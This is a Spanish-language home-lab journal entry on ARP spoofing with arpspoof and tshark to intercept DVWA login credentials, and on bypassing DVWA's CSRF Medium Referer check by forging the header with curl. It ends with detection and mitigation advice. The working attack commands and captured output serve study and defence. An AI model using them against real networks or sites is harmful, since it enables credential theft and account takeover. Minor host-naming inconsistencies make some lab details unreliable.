# Día 21 — ARP Spoofing & MITM + CSRF Medium

**Fecha:** Abril 2026  
**MITRE:** T1557.002, T1185  
**DVWA:** CSRF (Medium)

---

## Teoría

### ARP Spoofing & MITM
ARP (Address Resolution Protocol) traduce IPs a direcciones MAC. Cuando un dispositivo quiere comunicarse con otro en la red local, pregunta "¿quién tiene esta IP?" — el dueño responde con su MAC. ARP Spoofing consiste en responder a esas preguntas con información falsa, haciendo que el tráfico se dirija al atacante en lugar del destino real. El resultado es un ataque Man in the Middle — el atacante está en medio de toda la comunicación sin que ninguna de las partes lo sepa.

### CSRF Medium
En nivel Low el servidor no verificaba el origen del request — cualquier página podía enviar el formulario. En nivel Medium DVWA agrega verificación del header `Referer` — comprueba que el request provenga del mismo dominio. Sin embargo el `Referer` es un header HTTP controlado por el cliente, por lo que puede ser falsificado. Cualquier implementación de seguridad que dependa de valores modificables desde el lado del cliente es insegura.

---

## Red Team

### Sección 1 — ARP Spoofing

**Entorno:**
- Kali (atacante): `192.168.1.132` — MAC `08:00:27:58:97:4f`
- Ubuntu (víctima): `192.168.1.96`
- Gateway (router): `192.168.1.254`

**Paso 1 — Habilitar IP forwarding:**
```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```
Sin esto Kali descartaría los paquetes interceptados — la víctima perdería conexión.

**Paso 2 — Lanzar ARP Spoofing en dos terminales:**

Terminal 1 — engañar a Windows-Marco:
```bash
sudo arpspoof -i eth0 -t 192.168.1.96 192.168.1.254
```
Le dice a Windows-Marco: "el gateway está en la MAC de Kali"

Terminal 2 — engañar al router:
```bash
sudo arpspoof -i eth0 -t 192.168.1.254 192.168.1.96
```
Le dice al router: "Windows-Marco está en la MAC de Kali"

**Output del ataque:**
```
8:0:27:58:97:4f 8:0:27:fe:eb:70 0806 42: arp reply 192.168.1.254 is-at 8:0:27:58:97:4f
8:0:27:58:97:4f c4:34:5b:ac:a9:28 0806 42: arp reply 192.168.1.96 is-at 8:0:27:58:97:4f
```

**Flujo de tráfico con MITM activo:**
```
Normal:        Windows-Marco → Router → Internet
Con MITM:      Windows-Marco → Kali → Router → Internet
                                ↑
                      Kali ve todo el tráfico
```

**Paso 3 — Captura de tráfico:**
```bash
sudo tshark -i eth0 -f "host 192.168.1.96 and not arp" -Y "http" -T fields \
  -e ip.src -e ip.dst -e http.request.method -e http.request.uri -e http.file_data 2>/dev/null
```

**Credenciales capturadas — POST de login DVWA:**
```
192.168.1.132 → 192.168.1.96  POST  /login.php
```

Decodificando el hex del body:
```bash
echo "757365726e616d653d61646d696e26..." | xxd -r -p
```
```
username=admin&password=password&Login=Login&user_token=62042c53...
```

Credenciales en texto plano interceptadas ✅ — usuario, contraseña y CSRF token completos.

**Observación importante:**
Google y otros sitios con HTTPS no fueron interceptables — el contenido viaja cifrado. Solo tráfico HTTP queda expuesto. Esto confirma que HTTPS es la defensa principal contra MITM.

### Sección 2 — DVWA CSRF (Medium)

**Verificación del filtro — request sin Referer:**
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" \
  -b "PHPSESSID=<session>; security=medium" | grep -i "password\|success"
```
Sin output de éxito — bloqueado por verificación de Referer.

**Bypass — falsificar header Referer:**
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" \
  -b "PHPSESSID=<session>; security=medium" \
  -H "Referer: http://192.168.1.96:8080/vulnerabilities/csrf/" | grep -i "password"
```
```
Password Changed. ✅
```

**Diferencia Low vs Medium:**

| | Low | Medium |
|--|--|--|
| Protección | Sin protección | Verifica header `Referer` |
| Bypass | Request directo | Falsificar `Referer` con `-H` |
| ¿Seguro? | No | No |

**Por qué es insegura esta protección:**

El `Referer` es un header HTTP que el cliente envía — y el cliente puede mentir. Es un valor modificable desde el lado del cliente, por lo que no puede ser usado como mecanismo de seguridad confiable.

La defensa correcta es el **CSRF token** — un valor único generado por el servidor que el atacante no puede conocer ni falsificar porque nunca lo ve.

---

## Blue Team

### Detección ARP Spoofing
- Monitorear cambios en tablas ARP — si una MAC cambia frecuentemente es señal de spoofing
- Dynamic ARP Inspection (DAI) en switches empresariales detecta y bloquea ARP replies falsos
- Herramientas como `arpwatch` alertan sobre cambios en la tabla ARP
- HTTPS elimina la utilidad del MITM para robo de credenciales aunque no el ataque en sí

### Mitigación ARP Spoofing
- HTTPS en todos los servicios — el contenido viaja cifrado aunque el tráfico sea interceptado
- HSTS — fuerza HTTPS incluso si el usuario escribe HTTP
- VPN — todo el tráfico va cifrado al servidor VPN
- Static ARP entries para dispositivos críticos
- Dynamic ARP Inspection en switches

### Mitigación CSRF
- CSRF tokens únicos por sesión — el servidor genera un valor que el atacante no puede conocer
- SameSite cookie attribute — el browser no envía la cookie en requests cross-site
- Double Submit Cookie pattern
- Nunca confiar en headers controlados por el cliente como `Referer`

---

## Conclusión

ARP Spoofing demostró que en redes sin protección un atacante puede interceptar todo el tráfico HTTP en texto plano — credenciales, cookies y tokens fueron visibles. La defensa es HTTPS — el tráfico de Google fue ilegible porque viaja cifrado. CSRF Medium confirmó el principio fundamental: cualquier implementación de seguridad que dependa de valores modificables desde el lado del cliente es insegura. El header `Referer` puede ser falsificado trivialmente con curl o cualquier cliente HTTP.
